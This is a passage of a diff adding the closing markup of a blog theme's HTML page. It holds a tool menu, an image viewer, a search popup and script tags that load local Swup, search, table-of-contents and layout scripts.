+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+    
+<script src="/js/build/libs/minimasonry.min.js"></script>
+
+    
+<script src="/js/build/plugins/masonry.js" type="module"></script>
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
